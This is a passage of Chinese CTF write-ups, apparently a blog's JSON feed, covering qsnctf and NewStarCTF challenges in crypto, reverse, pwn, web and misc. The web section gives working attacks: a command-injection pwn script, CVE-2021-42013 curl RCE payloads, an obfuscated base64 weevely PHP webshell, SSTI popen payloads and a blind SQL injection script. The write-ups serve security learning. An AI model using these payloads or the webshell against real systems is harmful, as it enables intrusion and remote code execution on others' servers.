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\n+Vp/p01UAAAAASUVORK5CYII=\n\"\"\".split('\\n')\n  \ncontent = \"\"\nline = []\nfor i in content3:\n    content += i\ncontent+=\"\"\nprint(content)\nopen('flag.png','wb').write(base64.b64decode(content))\n```\n\n运行得到flag的另一半，最后拼接得到最终flag\n\n![](http://cdn.anyiblog.top/common/1668766383425-6a01adf8-f8f6-4805-93ee-4774e9b556a9.jpg)  \nqsnctf{b5512946-d7ac-45c9-afd0-a3f28ba547ea}\n\n# Crypto\n\n### 82.83.65\n\n```\nimport gmpy2\nimport libnum\nfrom Crypto.Util.number import *\nfrom binascii import a2b_hex,b2a_hex\n  \n  \nflag = b\"*********************\"\n  \n  \np = 262248800182277040650192055439906580479\nq = 262854994239322828547925595487519915551\n  \n  \ne = 65533\nn = p*q\n  \n  \nd = gmpy2.invert(e,(p-1)*(q-1))\n# print(d)\nc = pow(int(b2a_hex(flag),16),e,n)\nprint(c)\n# C = 31021919570683223794356421266753186826747161146739784961769368259629146487802\n```\n\nc,e,n,p,q都知道 带入工具先搞出d 然后再搞明文得到flag\n\n![](http://cdn.anyiblog.top/common/1668766383872-83316fbc-571a-480e-918e-115e46c28c9e.jpg)  \nqsnctf{RSA\\_SO\\_EASY\\_!}\n\n### Snake\n\n下载附件得到xlxs\n![](http://cdn.anyiblog.top/common/1668766384311-59de3ba8-9d93-4c9c-8048-8d1e48115ddc.jpg)  \n根据提示就\"s\"型看数据，然后把数据16进制转换下得到flag\n\n```\n71736E6374667B33393962313063642D633366392D343931622D6466623564303365346364307D\n```\n\n![](http://cdn.anyiblog.top/common/1668766384704-43ae8ad2-c6d8-4e2a-89cb-41cefe0e98ec.jpg)  \nqsnctf{399b10cd-c3f9-491b-dfb5d03e4cd0}\n\n### babyrsa RSbaby\n\n```\nfrom base64 import b64encode as b32encode\nfrom gmpy2 import invert,gcd,iroot\nfrom Crypto.Util.number import *\nfrom binascii import a2b_hex,b2a_hex\nimport random\n  \n  \nflag = \"*************\"\n  \n  \nnbit = 128\n  \n  \np = getPrime(nbit)\nq = getPrime(nbit)\nn = p*q\n  \n  \nprint p\nprint n\n  \n  \nphi = (p-1)*(q-1)\n  \n  \ne = random.randint(20000,50000)\n  \n  \nwhile True:\n    if gcd(e,phi) == 1:\n        break;\n    else:\n        e -= 1;\n  \n  \nc = pow(int(b2a_hex(flag),16),e,n)\n  \n  \nprint b32encode(str(c))[::-1]\n  \n  \nprint str(c)\n  \n  \n# 20392798836838831460465406987101354448592610558736461081264936079945558905138\n```\n\n```\np = 185392927331398754034773152474166007097\nn = 33047182186833739970146873552408478599841138065558351794468963853252513446871\nc = =gzMxUDM5gTN1UDN5kzNwYzM5QjNyEDOwEjN0YzM3gTN1ATM2ITO1gDN0QTNzEDMxcDO5YDM0UjN0AjN0EzM4gzM4YzM4gTO3ITOzAjM\n```\n\nn,p,c已知 e范围20000-50000 爆破下即可。\n\n```\nimport base64\nfrom gmpy2 import invert,gcd\nfrom Crypto.Util.number import *\n  \n  \nn = 33047182186833739970146873552408478599841138065558351794468963853252513446871\np = 185392927331398754034773152474166007097\nq = n//p\nc = '=gzMxUDM5gTN1UDN5kzNwYzM5QjNyEDOwEjN0YzM3gTN1ATM2ITO1gDN0QTNzEDMxcDO5YDM0UjN0AjN0EzM4gzM4YzM4gTO3ITOzAjM'\nc = int(base64.b64decode(c[::-1]).decode())\n  \n  \nphi=(p-1)*(q-1)\n  \n  \nfor e in range(20000,50000):\n    if gcd(e,phi) == 1:\n        d = invert(e,phi)\n        m = pow(c,d,n)\n        if b'qsnctf' in (long_to_bytes(m)):\n            print(long_to_bytes(m))\n  \n```\n\n运行得到flag\n![](http://cdn.anyiblog.top/common/1668766385039-c8a2d9e6-07f4-426e-820e-616791cb5dd6.jpg)  \nqsnctf{!RSA\\_SO\\_EASY$$}\n\n# Reverse\n\n### Check\n\n64位程序，主要程序：\n\n![](http://cdn.anyiblog.top/common/1668766385462-86c4b4a1-98b8-4dd7-8466-92e0c9c92c62.jpg)  \n异或解密下就行。\n\n```\nls = ['q','r','l','`','p','c','}','J','8','q',';','e','S','A','a','y','u','N','k','|','a','4','k'] + [\"\"]*100\nfor i in range(23):\n    ls[i+24] = chr(i ^ ord(ls[i]))\nprint(''.join(ls[23:]))\n```\nqsnctf{M0x1n\\_Love\\_you!}\n\n### EasyBase\n\n64位程序，windows程序代码是真的难看懂。。IDA分析\n\n![](http://cdn.anyiblog.top/common/1668766385995-7faa7f02-ad1e-4a8c-b37a-7dab62e901da.jpg)  \n前面是接收数据，然后分别加密后与最终结果比对\n![](http://cdn.anyiblog.top/common/1668766386396-e5b186ef-f71f-4ddd-9fa5-9993b55cb35f.jpg)  \n中间的加密分别是rot13 -> base64 -> rot13\n\nrot13函数：\n\n![](http://cdn.anyiblog.top/common/1668766386761-fd399841-f18d-4619-ae6e-3092d8af192e.jpg)  \n![](http://cdn.anyiblog.top/common/1668766387253-69be6a2f-d817-48be-8569-7c23f3b39856.jpg)  \nbase64函数：\n\n![](http://cdn.anyiblog.top/common/1668766387661-a7282a5c-1fd8-4b85-85a5-fcbe0caa73bf.jpg)  \n需要注意的是这里如果直接在线网站解解出来是错的，因为这边rot13多了一个操作，就是对数字也进行偏移计算，偏移量为5：\n\n![](http://cdn.anyiblog.top/common/1668766388007-8864d4ed-4d56-4771-9aad-a71a5cc2645a.jpg)  \n写下脚本解密下，还需要注意下就是比对的字符串要reverse反转一下。\n\n```\nimport base64\nimport string\n  \n  \ndef rot13(n):\n    digit = string.digits\n    lower = string.ascii_lowercase\n    upper = string.ascii_uppercase\n    res = \"\"\n    for i in n:\n        if i in digit:\n            res += chr((digit.index(i) +5)%10 + 48)\n        elif i in lower:\n            res += chr((lower.index(i) + 13)%26 +97)\n        elif i in upper:\n            res += chr((upper.index(i) + 13)%26 +65)\n        else:\n            res += i\n    return res\n  \n  \ncipher = \"=DzMuO8MmgaomuGA9Rmpj5lAkAwZgxQplNGYhOwAi6lAmywZlqGZ7LQB7pGs\"[::-1]\nprint(cipher,rot13(cipher))\nprint(rot13(base64.b64decode(rot13(cipher)).decode())[::-1])\n```\n\n![](http://cdn.anyiblog.top/common/1668766388385-4a7be585-1996-48c2-93c0-20c754f1a285.jpg)  \nqsnctf{af3036f5-2d87-4c75-a51b-2f47e2611312}\n\n### This..is?\n\n![](http://cdn.anyiblog.top/common/1668766388816-db7430ad-ef24-4992-8421-2422559af972.jpg)  \n这题是一个程序通过构造参数 向web容器发送数据，所以也可以看懂了re直接在web里做\n\n![](http://cdn.anyiblog.top/common/1668766389187-e7955e23-991d-4aae-90f7-de80a86b04cc.jpg)  \n32位程序，大部分没看懂 都是根据关键词尝试最后试出来的。\n\n程序有未定义代码需要修复一下，按p\n\n![](http://cdn.anyiblog.top/common/1668766389619-ed07e2e6-a38d-4330-a66c-3289511e2053.jpg)  \n![](http://cdn.anyiblog.top/common/1668766390097-9acd8f03-4029-48d4-8d6f-26e38162fe0e.jpg)  \n程序就是根据用户输入的数据进行构造url数据包发送，再把请求截取回来。同时程序还有许多过滤，其实只要在web上发送就不会被过滤\n\n已有信息账号admin 密码qsnctf2022\\_reverse\n\n查看程序发现传参是?username=xxx&password=xxxx\n\nweb传一下\n\n![](http://cdn.anyiblog.top/common/1668766390490-60b1c9f3-23c2-44f1-a316-151746d88ed4.jpg)  \n发现还需要传一个\"shell\"\n\n尝试post不是，仔细看代码发现是headers的数据发送shell\n\n那么hackbar构造一下再发送\n\n![](http://cdn.anyiblog.top/common/1668766390879-a54aefb7-4bbc-4597-a130-af2e609c213c.jpg)  \n提示Authorization有问题，Authorization即认证令牌 也是一个密码，再看程序。\n\n![](http://cdn.anyiblog.top/common/1668766391223-88e33080-350f-4e28-ac98-308251da878f.jpg)  \n\n\n程序里有一段base64 猜测是auth令牌的密码，解密得到：\n\n![](http://cdn.anyiblog.top/common/1668766391628-411799dd-ebf4-4919-841e-89d3697eed4e.jpg)  \n带入Authorization再次传参成功RCE\n\n![](http://cdn.anyiblog.top/common/1668766392046-41187319-796c-4119-acaa-92240648c097.jpg)  \nqsnctf{72d3bae2-7985-4e7d-bce8-8d5a743b9564}\n\n# Pwn\n\n### game\n\n![](http://cdn.anyiblog.top/common/1668766392414-71f7b25c-c509-407f-be97-e175233ef81c.jpg)  \n猜测一个数如果对了就执行back函数\n\nback：\n\n![](http://cdn.anyiblog.top/common/1668766392770-fb61c819-601a-4d1b-8146-d1257c291661.jpg)  \n用通配符绕过一下就能rce了\n\n这边随机数绕过，因为题目给了libc 可以利用libc来构造随机数是一定正确的。\n\n\n```\nfrom pwn import *\nfrom ctypes import *\n  \n  \ncontext.log_level='debug'\n  \n  \np = remote('recruit.qsnctf.com',10080)\n  \n  \nlibc = cdll.LoadLibrary('libc.so.6')\nlibc.srand(0x37)\n  \np.sendlineafter('guess num:\\n',str(libc.rand()))\np.sendline('1.1.1.1|cat /flag')\n  \n  \np.interactive()\n```\n\n![](http://cdn.anyiblog.top/common/1668766393221-b6bb3f37-068f-4c17-bb26-a0dce1363f05.jpg)  \nqsnctf{0301aa1c-9511-4a4d-9d32-a4811ba72b6f}\n\n### gift\n\n![](http://cdn.anyiblog.top/common/1668766393625-abbae773-dadb-45aa-ab56-bce36d9775c2.jpg)  \n\nint整型溢出，要求v4大于5，v4-1小于等于5。\n\n取int最大值+1即可 2147483647+1 = 2147483648\n\n![](http://cdn.anyiblog.top/common/1668766394009-060f2d3e-a10e-4aaf-bb12-cd65d503dec5.jpg)  \nqsnctf{39ee7f29-9bb2-42f5-950e-d6b21fcc563f}","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"NewStarCTF 公开赛第五周-收官周Writeup","url":"/2022/10/23/20221023/","content":"\n# 前言\n  \n本周也是NewStar的最后一周了，不知不觉一个月过去了哈哈，引用web的一道彩蛋\n  \n![](http://cdn.anyiblog.top/common/1666527748244-ded95000-cf3e-4975-a5db-3f8276def51d.jpg)  \n多少还是有点感动了，我哭死（\n  \n这次NewStarCTF学到了很多东西，二进制这块有进步，巩固了杂项和web等等。感谢各位出题人🙏题目质量很OK\n  \n以下是本周解题情况：\n  \n![](http://cdn.anyiblog.top/common/1666527749073-a0a7ed52-e13f-48d6-a322-5fec0586f5a3.jpg)本周难度还可以，web和misc真不难~~\n  \n# Web\n  \n### Web1.Give me your photo PLZ\n  \n![](http://cdn.anyiblog.top/common/1666527749561-7915c5ee-44f2-4d47-af78-6bc109c9803d.jpg)  \n文件上传题，上传后的图片会显示到当前页面，也就是说知道了图片url\n  \n尝试上传php\n![](http://cdn.anyiblog.top/common/1666527749972-d32ca501-7913-41ba-9b04-e145a6774a87.jpg)  \n被过滤了，考虑使用服务解析漏洞\n  \n先随便访问一个url造成报错，然后发现服务是apache2.4\n  \n![](http://cdn.anyiblog.top/common/1666527750323-206feb10-026b-4c6d-95aa-5951cdaa1544.jpg)  \napache存在一个文件解析漏洞，如果apache不认识文件的扩展名就会往前找，往前找.php扩展名 发现是php文件就会交给php解析器执行，具体参考这篇文章：[https://www.cnblogs.com/unknown404/p/10176272.html](https://www.cnblogs.com/unknown404/p/10176272.html#autoid-0-0-0)\n  \n那么，我们就可以构造1.php.aaa这种后缀，内容要写POST请求的马，然后去执行就可以getshell了。\n  \n![](http://cdn.anyiblog.top/common/1666527750761-b2394a67-cce7-442a-bf24-9ba70bf3bc71.jpg)  \n访问，然后post请求执行system函数。\n  \n![](http://cdn.anyiblog.top/common/1666527751149-ff555ee2-6268-4964-ad5f-5e2024fd834b.jpg)  \n可以看到成功执行了，后面找flag就行了 \n  \n彩蛋：\n![](http://cdn.anyiblog.top/common/1666527751500-319af1d9-88d7-4613-9a41-8e2ce7ae6681.jpg)  \n呜呜呜，可是我不知道env怎么拿啊（bushi\n  \n![](http://cdn.anyiblog.top/common/1666527751935-c027b844-2f2f-4313-b798-f6fd95dd7808.jpg)  \n\n### Web2.Unsafe Apache\n  \n![](http://cdn.anyiblog.top/common/1666527752304-a01cf46a-a6ae-4e15-a5c7-6b09f7dcb4e5.jpg)  \napache作为web服务的默认页面，结合题目名去找apache的漏洞\n  \nCVE-2021-42013 Apache HTTP Server 路径穿越漏洞，参考文章：[https://blog.csdn.net/qq\\_60905276/article/details/125163219](https://blog.csdn.net/qq_60905276/article/details/125163219)\n  \n原本是用.%2e绕过，但是被修复后就用.%%32e绕过cve-2021-41773的防御\n  \n  \n```\ncurl --data \"echo;ls\" http://node4.buuoj.cn:27830/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh\n```\n  \n把要执行的命令加到echo;后，即可RCE\n  \n  \n![](http://cdn.anyiblog.top/common/1666527752674-fc2119b1-4cdb-4f01-b394-17ff82b9ff5d.jpg)  \nflag在根目录下的ffffllll，构造cat /ffffllll\\* 即可\n  \nPayload：\n  \n```\ncurl --data \"echo;cat /ffff*\" http://node4.buuoj.cn:27830/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh\n```\n  \n![](http://cdn.anyiblog.top/common/1666527752995-9205b4ef-980c-40fc-94e8-043f6310f181.jpg)  \n\n### Web3.So Baby RCE Again\n  \n```\n<?php\nerror_reporting(0);\nif(isset($_GET[\"cmd\"])){\n    if(preg_match('/bash|curl/i',$_GET[\"cmd\"])){\n        echo \"Hacker!\";\n    }else{\n        shell_exec($_GET[\"cmd\"]);\n    }\n}else{\n    show_source(__FILE__);\n}\n```\n  \n上来直接就RCE了，需要注意的是shell\\_exec这个执行后不会有任何回显，有点像python的os.popen。大家可以去了解下这个函数的详情。\n  \n可以用\n```\n?cmd=pwd||sleep 1\n```\n  \n这种方式判断命令是否执行，若没有执行浏览器则会sleep 1s\n  \n还有\n```\n?cmd=ls > xxx.txt; //访问/xxx.txt\n```\n这种方式来看回显\n  \n原本是想弹vps的，但死活弹不上，就传了个weevely webshell，kali连接\n  \n```\n?cmd=echo PD9waHAKJG89J29PNGdSZ1IzdkRpVEEiO2Z1Z1JuY3Rpb2dSbiB4KCR0LCRrKXskZ1JnUmM9c3RybGVuKGdSJGdSayk7JGxnUj1zdGdScmxlbigkdCk7JGdSbz0iIjtmb3InOwokRD0nOyRyPWdSZ1JAYmFnUnNlNjRfZW5jb2dSZGdSZShAeChAZ2dSemNvbXByZ1Jlc3MoJG8pLCRrKSk7cHJnUmludCgiZ1IkcCRraCRnUnIka2YiKTt9JzsKJEc9J0BiYXNnUmU2NF9kZWNvZGUoZ1JnUmdSJG1bMV0pLCRrKSlnUik7JG89QGdSb2JfZ2V0X2dSY29udGVudHNnUigpO0BvYl9lbmdSZF9jZ1JsZWFuKCknOwokZD0nUmt7JGpnUmdSfTt9fXJlZ1J0dXJuICRvO31pZmdSIChAcHJlZ19tYXRnUmNoKGdSIi8ka2goLitnUilnUiRrZi8iLGdSQGZpbGVfZ2V0X2NvbnRnUmUnOwokZz1zdHJfcmVwbGFjZSgnSmsnLCcnLCdjSmtySmtlYXRlX0prSmtmSmtKa3VuY3Rpb24nKTsKJHQ9JyRrPSIyZ1IwMmNiOTZnUjIiO2dSJGtoPSJhYzU5Z1IwNzViZ1I5NjRiIjska2Y9ImdSZ1IwNzE1MmQyMzRiNzBnUiI7Z1IkcD0iTFdBUGdSVmI5JzsKJEk9JygkaT0wO2dSJGk8JGxnUjtnUil7Zm9yKCRnUmo9MGdSOygkajwkYyYmJGdSaTwkbCk7JGorK2dSLCRpK2dSKyl7Z1Ikby49JHR7JGdSaX1eJGcnOwokdz0nZ1JudHMoInBnUmhwZ1I6Ly9pbnB1dCJnUiksJG0pPT0xKSB7QG9nUmJfZ1JnUmdSc3RhcnQoKTtAZXZhZ1JsZ1IoQGd6dW5jb21wcmVzZ1JzKEB4KCc7CiRmPXN0cl9yZXBsYWNlKCdnUicsJycsJHQuJG8uJEkuJGQuJHcuJEcuJEQpOwokTD0kZygnJywkZik7JEwoKTsKPz4K | base64 -d > shell.php\n  \n// Password: 123\n//weevely http://a18436cc-3308-4ec2-b39c-d3422086f8fa.node4.buuoj.cn:81/shell.php 123\n```\n  \n![](http://cdn.anyiblog.top/common/1666527753508-6e29177b-74b2-45a6-b72b-f6df024535e6.jpg)  \n成功上线。\n  \nflag在/ffll444aaggg，但由于我们是webshell 所以没权限读\n  \n![](http://cdn.anyiblog.top/common/1666527753893-3860022e-758a-429b-a11e-99ff4a2843c4.jpg)  \n这里要越权读文件，用的学弟的办法date -f /ffll\\*\n  \n这个date -f可以把里面的内容当作回显输出\n  \n![](http://cdn.anyiblog.top/common/1666527754285-3957e472-f8c0-4f16-91ef-c1529c2ea164.jpg)  \n其他的做法我觉得可以参考第三周misc2那题的绕过办法。\n  \n### Web4.BabySSTI\\_Three\n  \n这题黑名单过滤的很多，各种类都被ban了\n  \n先用```7*7```看看能不能执行\n  \n![](http://cdn.anyiblog.top/common/1666527754703-81ac6882-7f25-4d8f-9c13-b8548d18c4e8.jpg)  \n显然OK，然后尝试构造```{{''.__class__}}```\n  \n  \n![](http://cdn.anyiblog.top/common/1666527755088-67040504-9196-4628-b70f-6e72dbc2164d.jpg)  \n发现被过滤，猜测是下划线和关键词都被过滤了。\n  \n这里就要用到编码绕过了，用\\\\x5f\\\\x5f这种方式可以代替 \"\\_\\_\"\n  \n然后每个类之间应用\\[\\]拼接\n  \n写了个小脚本方便构造\n  \n```\na = b\"__class__\"\nres = \"\"\nfor i in a:\n    res += \"\\\\x%s\"%hex(i)[2:]\nprint(\"['%s']\"%res)\n```\n  \n把要用的关键词填到里面就可以，之后就开始绕过！\n  \n这里我就贴下之前做的时候写的payload\n  \n```\nPayload:\n  \n  \n?name={{[]['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f']['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()[117]}}\n  \n#[]['__class__']['__base__ ']['__subclasses__'][117] //os\n  \n  \n?name={{[]['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f']['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()[117]['\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f']['\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f']['\\x70\\x6f\\x70\\x65\\x6e']('\\x6c\\x73\\x20\\x2f').read()}}\n  \n#[]['__class__']['__base__ ']['__subclasses__'][117]['__init__']['__globals__']['popen']['ls /'].read() // cmd: ls /\n  \n  \n#Welcome to NewStarCTF Again And Again, Dear app bin boot dev etc flag_in_h3r3_52daad home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var\n  \n  \n#flag:flag_in_h3r3_52daad\n  \n  \n?name={{[]['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f']['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()[117]['\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f']['\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f']['\\x70\\x6f\\x70\\x65\\x6e']('\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x5f\\x69\\x6e\\x5f\\x68\\x33\\x72\\x33\\x5f\\x35\\x32\\x64\\x61\\x61\\x64').read()}}\n  \n  \n#[]['__class__']['__base__ ']['__subclasses__'][117]['__init__']['__globals__']['popen']['cat /flag_in_h3r3_52daad'].read()\n```\n  \n![](http://cdn.anyiblog.top/common/1666527755540-f8e93aa8-9604-4f4b-849f-ea36a3d212ad.jpg)  \n\n### Web5.Final round\n  \n![](http://cdn.anyiblog.top/common/1666527759354-5e43d99c-f2e9-4828-b4b1-e3e93c3538a0.jpg)  \n又是之前的SQL注入类型的模板，尝试随便输一个数字\n  \n![](http://cdn.anyiblog.top/common/1666527759862-8b650a4d-983a-4081-97f8-20c8fed33388.jpg)  \n发现没有回显，再结合题目简介提示，想到sleep延时注入\n  \n构造payload测试下：```1 and sleep(3)```\n  \n![](http://cdn.anyiblog.top/common/1666527761574-69a38eee-32e5-4ed1-933f-a28f5fe9f458.jpg)  \n发现被过滤，一番尝试后发现是空格被过滤，字符间不能有空格，用编码%0b或者%0c绕过\n  \n发送后发现浏览器在转圈圈，说明存在延时注入\n  \n用concat截取字符串 再用ascii函数与某个数对比，是则sleep 否则过掉 用这种办法可以得到库 表 字段的每一个ascii 最后找到flag\n  \n类似于这样：```name=1%0band%0bif((ascii(substr(database(),0,1))>117),1,sleep(3))```\n  \n之后就是跑二分法脚本试出来的，脚本的payload要多改多试，flag在wfy.wfy\\_comments表的text字段中\n\n（忘记贴脚本了，来补一下）\n\n```\nimport requests\nimport time\n\ns = requests.session()\nurl = 'http://59d2a20f-566b-4efb-8d45-e391a9672c6d.node4.buuoj.cn:81/comments.php?name='\nflag = ''\ni = 0\nd = 0\nwhile d == 0:\n    i = i + 1\n    low = 32\n    high = 127\n    while low < high:\n        mid = (low + high) // 2\n        # payload = f'1%0band%0bif((ascii(substr(database(),{i},1))>{mid}),1,sleep(3))'\n        # payload = f'1%0band%0bif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid},1,sleep(3))'\n        # payload = f'1%0band%0bif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\"wfy_comments\")),{i},1))>{mid},1,sleep(3))'\n        payload = f'1%0band%0bif(ascii(substr((select(text)from(wfy_comments)where(user=\"f1ag_is_here\")),{i},1))>{mid},1,sleep(3))'\n        stime = time.time()\n        url1 = url + payload\n        r = s.get(url=url1)\n        r.encoding = \"utf-8\"\n        print(payload)\n        if time.time() - stime < 2:\n            low = mid + 1\n        else:\n            high = mid\n    if low != 32:\n        flag += chr(low)\n    else:\n        break\n    print(flag)\n```\n  \n![](http://cdn.anyiblog.top/common/1666527762061-365d363d-4d5e-4a1d-ad0c-c9386ec4b606.jpg)  \n\n# Misc\n  \n### Misc1.最后的流量分析\n  \nsql注入流量分析，wireshark分析\n  \n筛选条件http\n  \n![](http://cdn.anyiblog.top/common/1666527762572-d9222e42-a7e2-46cc-979f-f58399fc3c95.jpg)  \n可以看到一堆字段尝试，我的做法是筛选正确包的长度length来找flag\n  \nlength咋找呢？我们已知flag前缀为flag{，所以substr为1,2,3,4,5的我们都能找到正确的length\n  \n追踪tcp流，然后找下面的get包 查看其length\n  \n![](http://cdn.anyiblog.top/common/1666527763017-69758137-cd43-4343-8a0a-fd3390e440d2.jpg)  \nlength为768，用wireshark筛选条件```frame.len >= 768```\n  \n这个数字也可以改小点，筛选后按No.升序，一个个看下来就是flag了\n  \n![](http://cdn.anyiblog.top/common/1666527763494-bbccf5ab-f377-4208-a8ba-9e3c24e8d94e.jpg)  \n  \nFlag:flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}\n  \n（又重新找了遍累死了）\n这个流量分析和之前比还是比较简单的\n  \n### Misc2.奇怪的PDF 2\n  \n一个pdf却是lnk后缀，但也能打开 就很奇怪\n  \n打开属性看lnk内容\n  \n![](http://cdn.anyiblog.top/common/1666527763881-b2e01fa3-0a2c-4b0d-900d-4c8d4676679c.jpg)  \n本来只是看不懂去搜下百度，结果搜到原题了。。\n  \n参考：[https://www.anquanke.com/post/id/267031](https://www.anquanke.com/post/id/267031)\n  \n  \n解题步骤：\n  \n先获取pdf额外数据```findstr \"TVNDRgAAAA\" strange2.pdf.lnk > ans```\n  \n处理数据的base64加密：\n  \n```\nimport base64\n  \n  \nf = open(\"ans\", \"rb\")\ndata = f.read()\np = base64.b64decode(data)\nf.close()\nf = open(\"res.cab\", \"wb\")\nf.write(p)\nf.close()\nprint(\"-----------\")\n```\n  \n运行完得到了一个.cab文件，可以直接打开，发现flag.txt打开得到flag\n  \n![](http://cdn.anyiblog.top/common/1666527764298-989d194f-1eeb-4b24-af10-14893662905b.jpg)  \n![](http://cdn.anyiblog.top/common/1666527764649-a88c482b-1215-413d-a379-7877228ea3a7.jpg)  \nFlag：flag{It\\_1s\\_a\\_fak3\\_but\\_r3al\\_PDF}\n  \n### Misc3.Yesec no drumsticks 5\n  \n也是简单题，做的我都来劲了。。\n  \n下载文件到本地\n  \ngit管理：```git log(查看git记录)```\n  \n![](http://cdn.anyiblog.top/common/1666527765052-cc17dcaa-fda5-4d0b-b23b-6a5865825c1f.jpg)  \n没有什么东西\n  